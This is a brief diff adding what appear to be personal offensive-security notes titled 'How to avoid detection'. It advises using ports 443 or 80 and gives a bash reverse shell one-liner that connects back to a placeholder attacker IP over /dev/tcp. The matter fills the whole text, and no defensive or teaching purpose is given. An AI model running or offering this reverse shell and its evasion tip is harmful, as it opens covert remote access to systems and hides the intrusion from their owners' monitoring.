@@ -1,0 +1,10 @@
+sorry, it's messy i know but i will update if i remind something yourself
+
+How to avoid detection
+
+1. Use 443/80 port
+
+```
+bash -i >& /dev/tcp/your.ip/443 0>&1
+```
+
